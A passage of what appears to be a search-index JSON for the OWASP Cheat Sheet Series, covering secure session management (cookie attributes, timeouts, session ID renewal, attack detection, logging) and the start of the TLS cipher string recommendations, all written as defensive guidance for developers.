parameters (via automatic URL rewriting), if certain conditions are met (for example, the identification of web clients without support for cookies or not accepting cookies due to user privacy concerns).","title":"Used vs. Accepted Session ID Exchange Mechanisms"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#transport-layer-security","text":"In order to protect the session ID exchange from active eavesdropping and passive disclosure in the network traffic, it is essential to use an encrypted HTTPS (TLS) connection for the entire web session, not only for the authentication process where the user credentials are exchanged. Additionally, the Secure cookie attribute must be used to ensure the session ID is only exchanged through an encrypted channel. The usage of an encrypted communication channel also protects the session against some session fixation attacks where the attacker is able to intercept and manipulate the web traffic to inject (or fix) the session ID on the victim's web browser (see here and here ). The following set of best practices are focused on protecting the session ID (specifically when cookies are used) and helping with the integration of HTTPS within the web application: Do not switch a given session from HTTP to HTTPS, or vice-versa, as this will disclose the session ID in the clear through the network. When redirecting to HTTPS, ensure that the cookie is set or regenerated after the redirect has occurred. Do not mix encrypted and unencrypted contents (HTML pages, images, CSS, JavaScript files, etc) in the same page, or from the same domain. Where possible, avoid offering public unencrypted contents and private encrypted contents from the same host. Where insecure content is required, consider hosting this on a separate insecure domain. Implement HTTP Strict Transport Security (HSTS) to enforce HTTPS connections. See the OWASP Transport Layer Protection Cheat Sheet for more general guidance on implementing TLS securely. It is important to emphasize that TLS does not protect against session ID prediction, brute force, client-side tampering or fixation; however, it does provide effective protection against an attacker intercepting or stealing session IDs through a man in the middle attack.","title":"Transport Layer Security"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#cookies","text":"The session ID exchange mechanism based on cookies provides multiple security features in the form of cookie attributes that can be used to protect the exchange of the session ID:","title":"Cookies"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#secure-attribute","text":"The Secure cookie attribute instructs web browsers to only send the cookie through an encrypted HTTPS (SSL/TLS) connection. This session protection mechanism is mandatory to prevent the disclosure of the session ID through MitM (Man-in-the-Middle) attacks. It ensures that an attacker cannot simply capture the session ID from web browser traffic. Forcing the web application to only use HTTPS for its communication (even when port TCP/80, HTTP, is closed in the web application host) does not protect against session ID disclosure if the Secure cookie has not been set - the web browser can be deceived to disclose the session ID over an unencrypted HTTP connection. The attacker can intercept and manipulate the victim user traffic and inject an HTTP unencrypted reference to the web application that will force the web browser to submit the session ID in the clear. See also: SecureFlag","title":"Secure Attribute"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#httponly-attribute","text":"The HttpOnly cookie attribute instructs web browsers not to allow scripts (e.g. JavaScript or VBscript) an ability to access the cookies via the DOM document.cookie object. This session ID protection is mandatory to prevent session ID stealing through XSS attacks. However, if an XSS attack is combined with a CSRF attack, the requests sent to the web application will include the session cookie, as the browser always includes the cookies when sending requests. The HttpOnly cookie only protects the confidentiality of the cookie; the attacker cannot use it offline, outside of the context of an XSS attack. See the OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet . See also: HttpOnly","title":"HttpOnly Attribute"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#samesite-attribute","text":"SameSite allows a server define a cookie attribute making it impossible to the browser send this cookie along with cross-site requests. The main goal is to mitigate the risk of cross-origin information leakage, and provides some protection against cross-site request forgery attacks. See also: SameSite","title":"SameSite Attribute"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#domain-and-path-attributes","text":"The Domain cookie attribute instructs web browsers to only send the cookie to the specified domain and all subdomains. If the attribute is not set, by default the cookie will only be sent to the origin server. The Path cookie attribute instructs web browsers to only send the cookie to the specified directory or subdirectories (or paths or resources) within the web application. If the attribute is not set, by default the cookie will only be sent for the directory (or path) of the resource requested and setting the cookie. It is recommended to use a narrow or restricted scope for these two attributes. In this way, the Domain attribute should not be set (restricting the cookie just to the origin server) and the Path attribute should be set as restrictive as possible to the web application path that makes use of the session ID. Setting the Domain attribute to a too permissive value, such as example.com allows an attacker to launch attacks on the session IDs between different hosts and web applications belonging to the same domain, known as cross-subdomain cookies. For example, vulnerabilities in www.example.com might allow an attacker to get access to the session IDs from secure.example.com . Additionally, it is recommended not to mix web applications of different security levels on the same domain. Vulnerabilities in one of the web applications would allow an attacker to set the session ID for a different web application on the same domain by using a permissive Domain attribute (such as example.com ) which is a technique that can be used in session fixation attacks . Although the Path attribute allows the isolation of session IDs between different web applications using different paths on the same host, it is highly recommended not to run different web applications (especially from different security levels or scopes) on the same host. Other methods can be used by these applications to access the session IDs, such as the document.cookie object. Also, any web application can set cookies for any path on that host. Cookies are vulnerable to DNS spoofing/hijacking/poisoning attacks, where an attacker can manipulate the DNS resolution to force the web browser to disclose the session ID for a given host or domain.","title":"Domain and Path Attributes"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#expire-and-max-age-attributes","text":"Session management mechanisms based on cookies can make use of two types of cookies, non-persistent (or session) cookies, and persistent cookies. If a cookie presents the Max-Age (that has preference over Expires ) or Expires attributes, it will be considered a persistent cookie and will be stored on disk by the web browser based until the expiration time. Typically, session management capabilities to track users after authentication make use of non-persistent cookies. This forces the session to disappear from the client if the current web browser instance is closed. Therefore, it is highly recommended to use non-persistent cookies for session management purposes, so that the session ID does not remain on the web client cache for long periods of time, from where an attacker can obtain it. Ensure that sensitive information is not comprised, by ensuring that sensitive information is not persistent / encrypting / stored on a need basis for the duration of the need Ensure that unauthorized activities cannot take place via cookie manipulation Ensure secure flag is set to prevent accidental transmission over \"the wire\" in a non-secure manner Determine if all state transitions in the application code properly check for the cookies and enforce their use Ensure entire cookie should be encrypted if sensitive data is persisted in the cookie Define all cookies being used by the application, their name and why they are needed","title":"Expire and Max-Age Attributes"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#html5-web-storage-api","text":"The Web Hypertext Application Technology Working Group (WHATWG) describes the HTML5 Web Storage APIs, localStorage and sessionStorage , as mechanisms for storing name-value pairs client-side. Unlike HTTP cookies, the contents of localStorage and sessionStorage are not automatically shared within requests or responses by the browser and are used for storing data client-side.","title":"HTML5 Web Storage API"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#the-localstorage-api","text":"","title":"The localStorage API"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#scope","text":"Data stored using the localStorage API is accessible by pages which are loaded from the same origin, which is defined as the scheme ( https:// ), host ( example.com ), port ( 443 ) and domain/realm ( example.com ). This provides similar access to this data as would be achieved by using the secure flag on a cookie, meaning that data stored from https could not be retrieved via http . Due to potential concurrent access from separate windows/threads, data stored using localStorage may be susceptible to shared access issues (such as race-conditions) and should be considered non-locking ( Web Storage API Spec ).","title":"Scope"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#duration","text":"Data stored using the localStorage API is persisted across browsing sessions, extending the timeframe in which it may be accessible to other system users.","title":"Duration"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#offline-access","text":"The standards do not require localStorage data to be encrypted-at-rest, meaning it may be possible to directly access this data from disk.","title":"Offline Access"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#use-case","text":"WHATWG suggests the use of localStorage for data that needs to be accessed across windows or tabs, across multiple sessions, and where large (multi-megabyte) volumes of data may need to be stored for performance reasons.","title":"Use Case"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#the-sessionstorage-api","text":"","title":"The sessionStorage API"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#scope_1","text":"The sessionStorage API stores data within the window context from which it was called, meaning that Tab 1 cannot access data which was stored from Tab 2. Also, like the localStorage API, data stored using the sessionStorage API is accessible by pages which are loaded from the same origin, which is defined as the scheme ( https:// ), host ( example.com ), port ( 443 ) and domain/realm ( example.com ). This provides similar access to this data as would be achieved by using the secure flag on a cookie, meaning that data stored from https could not be retrieved via http .","title":"Scope"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#duration_1","text":"The sessionStorage API only stores data for the duration of the current browsing session. Once the tab is closed, that data is no longer retrievable. This does not necessarily prevent access, should a browser tab be reused or left open. Data may also persist in memory until a garbage collection event.","title":"Duration"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#offline-access_1","text":"The standards do not require sessionStorage data to be encrypted-at-rest, meaning it may be possible to directly access this data from disk.","title":"Offline Access"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#use-case_1","text":"WHATWG suggests the use of sessionStorage for data that is relevant for one-instance of a workflow, such as details for a ticket booking, but where multiple workflows could be performed in other tabs concurrently. The window/tab bound nature will keep the data from leaking between workflows in separate tabs.","title":"Use Case"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#security-risks","text":"In general, secure or sensitive data should not be stored persistently in browser data stores as this may permit information leakage on shared systems. Because the Web Storage mechanisms are APIs, this also permits access from injected scripts, making it less secure than cookies with the httponly flag applied. While a case could be made for storing workflow specific data in sessionStorage for use by that specific tab/window across reloads, the Web Storage APIs should be treated as insecure storage. Because of this, if a business solution requires the use of the localStorage or sessionStorage to store sensitive data, such a solution should encipher data and apply replay protections. Due to the potential to access Web Storage APIs via an XSS attack, session identifiers should be stored using non-persistent cookies, with the appropriate flags to protect from insecure access ( Secure ), XSS ( HttpOnly ) and CSRF issues ( SameSite ).","title":"Security Risks"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#references","text":"Web Storage APIs LocalStorage API SessionStorage API WHATWG Web Storage Spec","title":"References"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#web-workers","text":"Web Workers run JavaScript code in a global context separate from the one of the current window. A communication channel with the main execution window exists, which is called MessageChannel .","title":"Web Workers"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#use-case_2","text":"Web Workers are an alternative for browser storage of (session) secrets when storage persistence across page refresh is not a requirement. For Web Workers to provide secure browser storage, any code that requires the secret should exist within the Web Worker and the secret should never be transmitted to the main window context. Storing secrets within the memory of a Web Worker offers the same security guarantees as an HttpOnly cookie: the confidentiality of the secret is protected. Still, an XSS attack can be used to send messages to the Web Worker to perform an operation that requires the secret. The Web Worker will return the result of the operation to the main execution thread. The advantage of a Web Worker implementation compared to an HttpOnly cookie is that a Web Worker allows for some isolated JavaScript code to access the secret; an HttpOnly cookie is not accessible to any JavaScript. If the frontend JavaScript code requires access to the secret, the Web Worker implementation is the only browser storage option that preserves the secret confidentiality.","title":"Use Case"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-id-life-cycle","text":"","title":"Session ID Life Cycle"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-id-generation-and-verification-permissive-and-strict-session-management","text":"There are two types of session management mechanisms for web applications, permissive and strict, related to session fixation vulnerabilities. The permissive mechanism allows the web application to initially accept any session ID value set by the user as valid, creating a new session for it, while the strict mechanism enforces that the web application will only accept session ID values that have been previously generated by the web application. The session tokens should be handled by the web server if possible or generated via a cryptographically secure random number generator. Although the most common mechanism in use today is the strict one (more secure, PHP defaults to permissive ). Developers must ensure that the web application does not use a permissive mechanism under certain circumstances. Web applications should never accept a session ID they have never generated, and in case of receiving one, they should generate and offer the user a new valid session ID. Additionally, this scenario should be detected as a suspicious activity and an alert should be generated.","title":"Session ID Generation and Verification: Permissive and Strict Session Management"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#manage-session-id-as-any-other-user-input","text":"Session IDs must be considered untrusted, as any other user input processed by the web application, and they must be thoroughly validated and verified. Depending on the session management mechanism used, the session ID will be received in a GET or POST parameter, in the URL or in an HTTP header (e.g. cookies). If web applications do not validate and filter out invalid session ID values before processing them, they can potentially be used to exploit other web vulnerabilities, such as SQL injection if the session IDs are stored on a relational database, or persistent XSS if the session IDs are stored and reflected back afterwards by the web application.","title":"Manage Session ID as Any Other User Input"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change","text":"The session ID must be renewed or regenerated by the web application after any privilege level change within the associated user session. The most common scenario where the session ID regeneration is mandatory is during the authentication process, as the privilege level of the user changes from the unauthenticated (or anonymous) state to the authenticated state. Other common scenarios must also be considered, such as password changes, permission changes or switching from a regular user role to an administrator role within the web application. For all these web application critical pages, previous session IDs have to be ignored, a new session ID must be assigned to every new request received for the critical resource, and the old or previous session ID must be destroyed. The most common web development frameworks provide session functions and methods to renew the session ID, such as request.getSession(true) & HttpSession.invalidate() (J2EE), Session.Abandon() & Response.Cookies.Add(new...) (ASP .NET), or session_start() & session_regenerate_id(true) (PHP). The session ID regeneration is mandatory to prevent session fixation attacks , where an attacker sets the session ID on the victims user web browser instead of gathering the victims session ID, as in most of the other session-based attacks, and independently of using HTTP or HTTPS. This protection mitigates the impact of other web-based vulnerabilities that can also be used to launch session fixation attacks, such as HTTP response splitting or XSS (see here and here ). A complementary recommendation is to use a different session ID or token name (or set of session IDs) pre and post authentication, so that the web application can keep track of anonymous users and authenticated users without the risk of exposing or binding the user session between both states.","title":"Renew the Session ID After Any Privilege Level Change"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#considerations-when-using-multiple-cookies","text":"If the web application uses cookies as the session ID exchange mechanism, and multiple cookies are set for a given session, the web application must verify all cookies (and enforce relationships between them) before allowing access to the user session. It is very common for web applications to set a user cookie pre-authentication over HTTP to keep track of unauthenticated (or anonymous) users. Once the user authenticates in the web application, a new post-authentication secure cookie is set over HTTPS, and a binding between both cookies and the user session is established. If the web application does not verify both cookies for authenticated sessions, an attacker can make use of the pre-authentication unprotected cookie to get access to the authenticated user session (see here and here ). Web applications should try to avoid the same cookie name for different paths or domain scopes within the same web application, as this increases the complexity of the solution and potentially introduces scoping issues.","title":"Considerations When Using Multiple Cookies"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-expiration","text":"In order to minimize the time period an attacker can launch attacks over active sessions and hijack them, it is mandatory to set expiration timeouts for every session, establishing the amount of time a session will remain active. Insufficient session expiration by the web application increases the exposure of other session-based attacks, as for the attacker to be able to reuse a valid session ID and hijack the associated session, it must still be active. The shorter the session interval is, the lesser the time an attacker has to use the valid session ID. The session expiration timeout values must be set accordingly with the purpose and nature of the web application, and balance security and usability, so that the user can comfortably complete the operations within the web application without his session frequently expiring. Both the idle and absolute timeout values are highly dependent on how critical the web application and its data are. Common idle timeouts ranges are 2-5 minutes for high-value applications and 15-30 minutes for low risk applications. Absolute timeouts depend on how long a user usually uses the application. If the application is intended to be used by an office worker for a full day, an appropriate absolute timeout range could be between 4 and 8 hours. When a session expires, the web application must take active actions to invalidate the session on both sides, client and server. The latter is the most relevant and mandatory from a security perspective. For most session exchange mechanisms, client side actions to invalidate the session ID are based on clearing out the token value. For example, to invalidate a cookie it is recommended to provide an empty (or invalid) value for the session ID, and set the Expires (or Max-Age ) attribute to a date from the past (in case a persistent cookie is being used): Set-Cookie: id=; Expires=Friday, 17-May-03 18:45:00 GMT In order to close and invalidate the session on the server side, it is mandatory for the web application to take active actions when the session expires, or the user actively logs out, by using the functions and methods offered by the session management mechanisms, such as HttpSession.invalidate() (J2EE), Session.Abandon() (ASP .NET) or session_destroy()/unset() (PHP).","title":"Session Expiration"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#automatic-session-expiration","text":"","title":"Automatic Session Expiration"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#idle-timeout","text":"All sessions should implement an idle or inactivity timeout. This timeout defines the amount of time a session will remain active in case there is no activity in the session, closing and invalidating the session upon the defined idle period since the last HTTP request received by the web application for a given session ID. The idle timeout limits the chances an attacker has to guess and use a valid session ID from another user. However, if the attacker is able to hijack a given session, the idle timeout does not limit the attacker's actions, as he can generate activity on the session periodically to keep the session active for longer periods of time. Session timeout management and expiration must be enforced server-side. If the client is used to enforce the session timeout, for example using the session token or other client parameters to track time references (e.g. number of minutes since login time), an attacker could manipulate these to extend the session duration.","title":"Idle Timeout"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#absolute-timeout","text":"All sessions should implement an absolute timeout, regardless of session activity. This timeout defines the maximum amount of time a session can be active, closing and invalidating the session upon the defined absolute period since the given session was initially created by the web application. After invalidating the session, the user is forced to (re)authenticate again in the web application and establish a new session. The absolute session limits the amount of time an attacker can use a hijacked session and impersonate the victim user.","title":"Absolute Timeout"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#renewal-timeout","text":"Alternatively, the web application can implement an additional renewal timeout after which the session ID is automatically renewed, in the middle of the user session, and independently of the session activity and, therefore, of the idle timeout. After a specific amount of time since the session was initially created, the web application can regenerate a new ID for the user session and try to set it, or renew it, on the client. The previous session ID value would still be valid for some time, accommodating a safety interval, before the client is aware of the new ID and starts using it. At that time, when the client switches to the new ID inside the current session, the application invalidates the previous ID. This scenario minimizes the amount of time a given session ID value, potentially obtained by an attacker, can be reused to hijack the user session, even when the victim user session is still active. The user session remains alive and open on the legitimate client, although its associated session ID value is transparently renewed periodically during the session duration, every time the renewal timeout expires. Therefore, the renewal timeout complements the idle and absolute timeouts, specially when the absolute timeout value extends significantly over time (e.g. it is an application requirement to keep the user sessions open for long periods of time). Depending on the implementation, potentially there could be a race condition where the attacker with a still valid previous session ID sends a request before the victim user, right after the renewal timeout has just expired, and obtains first the value for the renewed session ID. At least in this scenario, the victim user might be aware of the attack as her session will be suddenly terminated because her associated session ID is not valid anymore.","title":"Renewal Timeout"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#manual-session-expiration","text":"Web applications should provide mechanisms that allow security aware users to actively close their session once they have finished using the web application.","title":"Manual Session Expiration"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#logout-button","text":"Web applications must provide a visible and easily accessible logout (logoff, exit, or close session) button that is available on the web application header or menu and reachable from every web application resource and page, so that the user can manually close the session at any time. As described in Session_Expiration section, the web application must invalidate the session at least on server side. NOTE : Unfortunately, not all web applications facilitate users to close their current session. Thus, client-side enhancements allow conscientious users to protect their sessions by helping to close them diligently.","title":"Logout Button"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#web-content-caching","text":"Even after the session has been closed, it might be possible to access the private or sensitive data exchanged within the session through the web browser cache. Therefore, web applications must use restrictive cache directives for all the web traffic exchanged through HTTP and HTTPS, such as the Cache-Control and Pragma HTTP headers, and/or equivalent META tags on all or (at least) sensitive web pages. Independently of the cache policy defined by the web application, if caching web application contents is allowed, the session IDs must never be cached, so it is highly recommended to use the Cache-Control: no-cache=\"Set-Cookie, Set-Cookie2\" directive, to allow web clients to cache everything except the session ID (see here ).","title":"Web Content Caching"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#additional-client-side-defenses-for-session-management","text":"Web applications can complement the previously described session management defenses with additional countermeasures on the client side. Client-side protections, typically in the form of JavaScript checks and verifications, are not bullet proof and can easily be defeated by a skilled attacker, but can introduce another layer of defense that has to be bypassed by intruders.","title":"Additional Client-Side Defenses for Session Management"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#initial-login-timeout","text":"Web applications can use JavaScript code in the login page to evaluate and measure the amount of time since the page was loaded and a session ID was granted. If a login attempt is tried after a specific amount of time, the client code can notify the user that the maximum amount of time to log in has passed and reload the login page, hence retrieving a new session ID. This extra protection mechanism tries to force the renewal of the session ID pre-authentication, avoiding scenarios where a previously used (or manually set) session ID is reused by the next victim using the same computer, for example, in session fixation attacks.","title":"Initial Login Timeout"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#force-session-logout-on-web-browser-window-close-events","text":"Web applications can use JavaScript code to capture all the web browser tab or window close (or even back) events and take the appropriate actions to close the current session before closing the web browser, emulating that the user has manually closed the session via the logout button.","title":"Force Session Logout On Web Browser Window Close Events"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#disable-web-browser-cross-tab-sessions","text":"Web applications can use JavaScript code once the user has logged in and a session has been established to force the user to re-authenticate if a new web browser tab or window is opened against the same web application. The web application does not want to allow multiple web browser tabs or windows to share the same session. Therefore, the application tries to force the web browser to not share the same session ID simultaneously between them. NOTE : This mechanism cannot be implemented if the session ID is exchanged through cookies, as cookies are shared by all web browser tabs/windows.","title":"Disable Web Browser Cross-Tab Sessions"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#automatic-client-logout","text":"JavaScript code can be used by the web application in all (or critical) pages to automatically logout client sessions after the idle timeout expires, for example, by redirecting the user to the logout page (the same resource used by the logout button mentioned previously). The benefit of enhancing the server-side idle timeout functionality with client-side code is that the user can see that the session has finished due to inactivity, or even can be notified in advance that the session is about to expire through a count down timer and warning messages. This user-friendly approach helps to avoid loss of work in web pages that require extensive input data due to server-side silently expired sessions.","title":"Automatic Client Logout"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-attacks-detection","text":"","title":"Session Attacks Detection"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-id-guessing-and-brute-force-detection","text":"If an attacker tries to guess or brute force a valid session ID, he needs to launch multiple sequential requests against the target web application using different session IDs from a single (or set of) IP address(es). Additionally, if an attacker tries to analyze the predictability of the session ID (e.g. using statistical analysis), he needs to launch multiple sequential requests from a single (or set of) IP address(es) against the target web application to gather new valid session IDs. Web applications must be able to detect both scenarios based on the number of attempts to gather (or use) different session IDs and alert and/or block the offending IP address(es).","title":"Session ID Guessing and Brute Force Detection"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#detecting-session-id-anomalies","text":"Web applications should focus on detecting anomalies associated to the session ID, such as its manipulation. The OWASP AppSensor Project provides a framework and methodology to implement built-in intrusion detection capabilities within web applications focused on the detection of anomalies and unexpected behaviors, in the form of detection points and response actions. Instead of using external protection layers, sometimes the business logic details and advanced intelligence are only available from inside the web application, where it is possible to establish multiple session related detection points, such as when an existing cookie is modified or deleted, a new cookie is added, the session ID from another user is reused, or when the user location or User-Agent changes in the middle of a session.","title":"Detecting Session ID Anomalies"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#binding-the-session-id-to-other-user-properties","text":"With the goal of detecting (and, in some scenarios, protecting against) user misbehaviors and session hijacking, it is highly recommended to bind the session ID to other user or client properties, such as the client IP address, User-Agent, or client-based digital certificate. If the web application detects any change or anomaly between these different properties in the middle of an established session, this is a very good indicator of session manipulation and hijacking attempts, and this simple fact can be used to alert and/or terminate the suspicious session. Although these properties cannot be used by web applications to trustingly defend against session attacks, they significantly increase the web application detection (and protection) capabilities. However, a skilled attacker can bypass these controls by reusing the same IP address assigned to the victim user by sharing the same network (very common in NAT environments, like Wi-Fi hotspots) or by using the same outbound web proxy (very common in corporate environments), or by manually modifying his User-Agent to look exactly as the victim users does.","title":"Binding the Session ID to Other User Properties"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#logging-sessions-life-cycle-monitoring-creation-usage-and-destruction-of-session-ids","text":"Web applications should increase their logging capabilities by including information regarding the full life cycle of sessions. In particular, it is recommended to record session related events, such as the creation, renewal, and destruction of session IDs, as well as details about its usage within login and logout operations, privilege level changes within the session, timeout expiration, invalid session activities (when detected), and critical business operations during the session. The log details might include a timestamp, source IP address, web target resource requested (and involved in a session operation), HTTP headers (including the User-Agent and Referer), GET and POST parameters, error codes and messages, username (or user ID), plus the session ID (cookies, URL, GET, POST\u2026). Sensitive data like the session ID should not be included in the logs in order to protect the session logs against session ID local or remote disclosure or unauthorized access. However, some kind of session-specific information must be logged in order to correlate log entries to specific sessions. It is recommended to log a salted-hash of the session ID instead of the session ID itself in order to allow for session-specific log correlation without exposing the session ID. In particular, web applications must thoroughly protect administrative interfaces that allow to manage all the current active sessions. Frequently these are used by support personnel to solve session related issues, or even general issues, by impersonating the user and looking at the web application as the user does. The session logs become one of the main web application intrusion detection data sources, and can also be used by intrusion protection systems to automatically terminate sessions and/or disable user accounts when (one or many) attacks are detected. If active protections are implemented, these defensive actions must be logged too.","title":"Logging Sessions Life Cycle: Monitoring Creation, Usage, and Destruction of Session IDs"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#simultaneous-session-logons","text":"It is the web application design decision to determine if multiple simultaneous logons from the same user are allowed from the same or from different client IP addresses. If the web application does not want to allow simultaneous session logons, it must take effective actions after each new authentication event, implicitly terminating the previously available session, or asking the user (through the old, new or both sessions) about the session that must remain active. It is recommended for web applications to add user capabilities that allow checking the details of active sessions at any time, monitor and alert the user about concurrent logons, provide user features to remotely terminate sessions manually, and track account activity history (logbook) by recording multiple client details such as IP address, User-Agent, login date and time, idle time, etc.","title":"Simultaneous Session Logons"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-management-waf-protections","text":"There are situations where the web application source code is not available or cannot be modified, or when the changes required to implement the multiple security recommendations and best practices detailed above imply a full redesign of the web application architecture, and therefore, cannot be easily implemented in the short term. In these scenarios, or to complement the web application defenses, and with the goal of keeping the web application as secure as possible, it is recommended to use external protections such as Web Application Firewalls (WAFs) that can mitigate the session management threats already described. Web Application Firewalls offer detection and protection capabilities against session based attacks. On the one hand, it is trivial for WAFs to enforce the usage of security attributes on cookies, such as the Secure and HttpOnly flags, applying basic rewriting rules on the Set-Cookie header for all the web application responses that set a new cookie. On the other hand, more advanced capabilities can be implemented to allow the WAF to keep track of sessions, and the corresponding session IDs, and apply all kind of protections against session fixation (by renewing the session ID on the client-side when privilege changes are detected), enforcing sticky sessions (by verifying the relationship between the session ID and other client properties, like the IP address or User-Agent), or managing session expiration (by forcing both the client and the web application to finalize the session). The open-source ModSecurity WAF, plus the OWASP Core Rule Set , provide capabilities to detect and apply security cookie attributes, countermeasures against session fixation attacks, and session tracking features to enforce sticky sessions.","title":"Session Management WAF Protections"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html","text":"TLS Cipher String Cheat Sheet \u00b6 Introduction \u00b6 This article is focused on providing clear and simple examples for the cipher string. They are based on different scenarios where you use the Transport Layer Security (TLS) protocol. Recommendations for a cipher string \u00b6 Scenarios \u00b6 The cipher strings are based on the recommendation to setup your policy to get a whitelist for your ciphers as described in the Transport Layer Protection Cheat Sheet (Rule - Only Support Strong Cryptographic Ciphers) . The latest and strongest ciphers as well as additional improvements are solely available with TLSv1.3, older protocols don't support them. Please find enclosed all supported protocols by the scenario. Finally we have compiled the oldest versions of different client agents that are still compatible with a cipher string. We provide this information according to the ciphers and protocols supported by browsers, libraries, bots on the basis of ssllabs's list of user agent capabilities and tests on our own. We have checked this thoroughly, but please accept that all data is provided without any warranty of any kind. The list of the oldest supported clients assumes that the server supports all ciphers by the scenario (Please contact the authors if you find any errors or if you can provide additional data). The recommended cipher strings are based on different scenarios: OWASP Cipher String 'A' (Advanced, wide browser compatibility, e.g. to most newer browser versions): Recommended if you control the server and the clients. Make sure to check the compatibility before using it. Includes solely the strongest Perfect Forward Secrecy (PFS) and authenticated ciphers. Protocols: TLSv1.3 , TLSv1.2 (and newer or better). Oldest known clients that are compatible: Android 4.4.2, BingPreview Jan 2015, Chrome 32/Win 7, Chrome 34/OS X, Edge 12/Win 10, Firefox 27/Win 8, Googlebot Feb 2015, IE11/Win 7 + MS14-066, Java 8b132, OpenSSL 1.0.1e, Safari 9/iOS 9, Yahoo Slurp Jun 2014, YandexBot Sep 2014. OWASP Cipher String 'B' (Broad compatibility to browsers, check the compatibility to other protocols before using it, e.g. IMAPS): Recommended if you solely control the server, the clients use their browsers and if you check the compatibility before using it for other protocols than HTTPS. Includes solely the strongest and stronger PFS ciphers. Protocols: TLSv1.3 , TLSv1.2 (and newer or better). Oldest known clients that are compatible: Android 4.4.2, BingPreview Jan 2015, Chrome 30/Win 7, Chrome 34/OS X, Edge 12/Win 10, Firefox 27/Win 8, Googlebot Feb 2015, IE11/Win 7, IE 11/WinPhone 8.1, Java 8b132, OpenSSL 1.0.1e, Opera 17/Win 7, Safari 5/iOS 5.1.1, Safari 7/OS X 10.9, Yahoo Slurp Jun 2014, YandexBot Sep 2014 OWASP Cipher String 'C' (Widest Compatibility, compatibility to most legacy browsers, legacy libraries (still patched) and other application protocols besides https, e.g. IMAPS): You may use this if you solely control the server, your clients use elder browsers and other elder libraries or if you use other protocols than HTTPS. Includes solely PFS ciphers. Be aware of additional risks and of new vulnerabilities that may appear are more likely than above. Plan to phase out SHA-1 and TLSv1, TLSv1.1 for HTTPS in middle-term. Protocols: TLSv1.3 , TLSv1.2 , TLSv1.1 , TLSv1 (and newer or better). Oldest known clients that are compatible: Android 2.3.7/4.0.4, Baidu Jan 2015, BingPreview Dec 2013, Chrome 27/Win 7, Chrome 34/OS X, Edge 12/Win 10, Firefox 10.0.12 ESR/Win 7, Firefox 21/Win 7+Fedora 19, Googlebot Oct 2013, IE 7/Vista, IE 10/WinPhone 8.0, Java 7u25, OpenSSL 0.9.8y, Opera 12.15/Win 7, Safari 5/iOS 5.1.1, Safari 5.1.9/macOS 10.6.8, Yahoo Slurp Oct 2013, YandexBot May 2014 OWASP Cipher String 'D' (Legacy, widest compatibility to real old browsers and legacy libraries and other application protocols like SMTP): Take care, use this cipher string only if you are forced to support non PFS for real old clients with very old libraries or for other protocols besides HTTPS. Be aware of the existing risks (e.g. ciphers without PFS, ciphers with 3DES) and of new vulnerabilities that may appear the most likely. Do not use WEAK ciphers based on 3DES e.g. ( TLS_RSA_WITH_3DES_EDE_CBC_SHA , DES-CBC3-SHA ) Never use even more INSECURE or elder ciphers based on RC2 , RC4 , DES , MD4 , MD5 , EXP , EXP1024 , AH , ADH , aNULL , eNULL , SEED nor IDEA . PFS ciphers are preferred, except all DHE ciphers that use SHA-1 (to prevent possible incompatibility issues caused by the length of the DHparameter ). Plan to move to 'A' for HTTPS or at least 'B' otherwise in middle-term. Protocols: TLSv1.3 , TLSv1.2 , TLSv1.1 , TLSv1 (and newer or better). Table of the ciphers (and their priority from high (1) to low (e.g. 18)) \u00b6 IANA, OpenSSL and other crypto libraries use slightly different names for the same ciphers. This table lists the names used by IANA and by openssl in brackets [] . Additional you can find the unambiguously hex values defined by IANA. Mozilla offers a larger cipher names correspondence table . Cipher name: IANA, [OpenSSL] Cipher HEX value Advanced (A) Broad Compatibility (B) Widest Compatibility (C) Legacy (D) TLS_AES_256_GCM_SHA384 (TLSv1.3) , [ 